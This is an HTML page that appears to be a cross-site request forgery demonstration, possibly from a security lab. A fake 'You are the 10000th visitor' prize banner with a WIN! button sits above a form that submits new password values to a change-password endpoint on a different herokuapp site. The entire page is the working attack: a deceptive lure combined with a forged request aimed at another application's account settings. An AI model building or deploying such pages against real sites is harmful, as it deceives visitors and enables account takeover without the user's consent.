<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Narrow Jumbotron Template for Bootstrap</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </head>

  <body>
    <div class="container">
      <div class="jumbotron">
        <h1>You are the 10000th visitor</h1>
        <p class="lead">You have a chance to win something. All you have to do is click the WIN! button below!</p>
        <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
      </div>
	  
	  <form method="post" action="http://silver-quire.herokuapp.com/change-password" class="form-horizontal" >
      <div class="form-group">
        <label for="password" class="col-sm-4 control-label">Password</label>
        <div class="col-sm-4">
          <input id="password_confirmation" type="password" name="user[password]" class="form-control"/>
        </div>
      </div>
      <div class="form-group">
        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
        <div class="col-sm-4">
          <input id="password_confirmation" type="password" name="user[password_confirmation]" class="form-control"/>
        </div>
      </div>
      <div class="form-group">
        <div class="col-sm-offset-4 col-sm-4">
          <button type="submit" class="btn btn-primary">Change!</button>
        </div>
      </div>
    </form>
  </body>
</html>
